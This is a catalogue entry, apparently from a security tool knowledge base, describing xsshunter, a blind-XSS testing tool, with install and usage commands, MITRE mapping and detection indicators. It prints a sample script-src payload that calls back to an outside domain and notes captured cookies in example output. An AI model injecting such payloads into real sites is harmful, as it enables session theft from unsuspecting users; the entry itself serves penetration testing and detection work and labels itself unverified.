---
id: tool-xsshunter
url: 'https://xsshunter.com'
tags:
  - xss
  - payload-detection
type: tool
verified: false
platforms:
  - Linux
  - Windows
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:41.657Z'
validated: true
submitted: true
---
# xsshunter

**Status**: Unverified

## Overview

xsshunter is a free, open-source tool for creating and managing XSS hunting campaigns. It generates trackable payloads and provides a dashboard to detect when and where XSS payloads execute, ideal for confirming stored or reflected XSS vulnerabilities in web applications.

## Description

Designed for penetration testers and bug bounty hunters, xsshunter allows deployment of JavaScript payloads that callback to a central server upon execution. In offensive security, it's used to verify XSS exploits remotely without manual browser checks, capturing details like victim IP, user-agent, and cookies. It supports custom domains to evade basic filters and integrates with reporting platforms like HackerOne.

## Features

- Feature 1: Payload generation with unique IDs for tracking multiple campaigns
- Feature 2: Real-time dashboard for execution logs and victim details
- Feature 3: Customizable payloads (e.g., img onerror, script src) for different XSS types

## Installation

### Requirements

- Node.js (v14+)
- Git
- A domain/subdomain for hosting the hunter

### Install Commands

```bash
# Clone the repository
git clone https://github.com/mandatoryprogrammer/xsshunter.git
cd xsshunter

# Install dependencies
npm install

# Set up database (SQLite by default)
node index.js
```

## Basic Usage

```bash
node index.js
```

### Common Options

| Option | Description |
|--------|-------------|
| `-h, --help` | Show help message |
| `-p, --port` | Specify port for the server (default 80) |
| `-d, --domain` | Set custom domain for payloads |

## Examples

### Example 1: Basic Usage

```bash
node index.js -d myhunter.com
```

This starts the server and generates payloads like <script src="https://myhunter.com/123"></script>.

### Example 2: Advanced Usage

```bash
node index.js -p 8080 --db-path ./data.db
```

Run on port 8080 with custom SQLite path; access dashboard at http://localhost:8080.

## Expected Output

Server logs executions: e.g., "Payload 123 executed from IP 192.168.1.1 with cookies: session=abc".

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual outbound requests to external domains from web apps
- JavaScript errors referencing unknown src attributes
- Network logs showing callbacks to xsshunter-like endpoints

## Related Procedures


## Related Tools

- [[Burp Suite]]
- [[BeEF]]

## References

- Official documentation: https://xsshunter.com/docs
- GitHub: https://github.com/mandatoryprogrammer/xsshunter
